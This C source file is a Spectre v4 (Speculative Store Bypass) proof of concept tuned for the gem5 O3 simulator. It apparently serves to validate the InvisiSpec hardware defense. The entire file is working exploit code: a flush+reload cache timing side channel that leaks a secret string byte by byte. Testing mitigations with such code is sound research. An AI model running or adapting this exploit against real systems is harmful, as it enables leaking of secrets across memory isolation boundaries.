/* Speculative Store Bypass (Spectre v4 / CVE-2018-3639) — tuned for gem5 O3.
 * Mirrors spectre_full.c's measurement harness (999 tries, clflush, mixed-order
 * timed reload, Success/Unclear scoring, byte loop) so the InvisiSpec validator's
 * _FULL_SUCCESS parser ("Success: 0xNN") picks up a real recovered secret.
 *
 * SSB trigger (no branch mistraining): a pointer slot *pp holds a STALE pointer
 * to the secret byte. The victim overwrites it with a public pointer (STORE),
 * then immediately reloads and derefs it (LOAD **pp). We clflush the slot each
 * iteration so the STORE's address/data resolution lags; gem5 O3's memory-
 * dependence predictor then lets the reload issue speculatively past the
 * unresolved store, reading the STALE secret pointer and transmitting the
 * secret byte through array2. Architecturally v == public (safe).
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h> /* rdtscp, clflush */

uint8_t array2[256 * 512];
char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t public_byte = 0;      /* the "safe" value the store redirects to */
uint8_t temp = 0;             /* keep victim from being optimized out */

/* the store-bypass slot: a pointer we store-to then reload-and-deref */
uint8_t * volatile slot;

void victim_function_v4(uint8_t *public_ptr) {
  slot = public_ptr;                 /* STORE: redirect slot to the public byte */
  uint8_t v = *slot;                 /* LOAD+DEREF: may bypass store, read stale */
  temp &= array2[v * 512];           /* transmit v through the cache */
}

#define CACHE_HIT_THRESHOLD (80)

void readMemoryByte(uint8_t *secret_ptr, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  for (i = 0; i < 256; i++) results[i] = 0;
  for (tries = 999; tries > 0; tries--) {
    for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);  /* flush probe */

    for (j = 29; j >= 0; j--) {
      /* Leave the STALE secret pointer in the slot, then flush the slot so the
       * upcoming store's resolution is delayed and the reload speculates past it. */
      slot = secret_ptr;
      _mm_clflush((void *)&slot);
      for (volatile int z = 0; z < 100; z++) {} /* widen the window */
      victim_function_v4(&public_byte);          /* store public, reload -> bypass */
    }

    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      time1 = __rdtscp(&junk);
      time1 = __rdtscp(&junk);
      junk = *addr;
      time2 = __rdtscp(&junk) - time1;
      time2 = __rdtscp(&junk) - time1;
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != public_byte)
        results[mix_i]++;
    }

    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
      else if (k < 0 || results[i] >= results[k]) { k = i; }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break;
  }
  results[0] ^= junk;
  value[0] = (uint8_t)j; score[0] = results[j];
  value[1] = (uint8_t)k; score[1] = results[k];
}

int main(void) {
  int i, score[2], len = 40;
  uint8_t value[2];
  for (i = 0; i < (int)sizeof(array2); i++) array2[i] = 1; /* fault pages in */

  printf("Reading %d bytes (SSB / Spectre v4):\n", len);
  for (i = 0; i < len; i++) {
    printf("Reading secret byte %d... ", i);
    readMemoryByte((uint8_t *)(secret + i), value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d\n", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
  }
  return 0;
}
